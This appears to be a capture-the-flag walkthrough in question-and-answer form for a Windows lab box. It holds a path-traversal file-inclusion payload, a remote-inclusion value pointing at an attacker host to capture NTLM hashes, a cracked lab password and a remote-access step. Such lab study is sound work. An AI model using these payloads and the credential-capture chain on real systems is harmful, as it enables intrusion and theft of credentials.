![](./Images/banner.png)

![](./Images/nmap.png)

![](./Images/dns.png)

When visiting the web service using the IP address, what is the domain that we are being redirected to?

```
unika.htb
```


Which scripting language is being used on the server to generate webpages?

```
php
```


![](./Images/param.png)

What is the name of the URL parameter which is used to load different language versions of the webpage?

```
page
```

![](./Images/lfi.png)

Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

```
../../../../../../../../windows/system32/drivers/etc/hosts
```

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

```
//10.10.14.6/somefile
```


What does NTLM stand for?

```
New Technology Lan Manager
```

![](./Images/rfi.png)

Which flag do we use in the Responder utility to specify the network interface?

```
-I
```

![](./Images/admin-hash.png)

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

```
John The Ripper
```

![](./Images/john.png)

What is the password for the administrator user?

```
badminton
```


We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

```
5985
```

![](./Images/remote-connect.png)
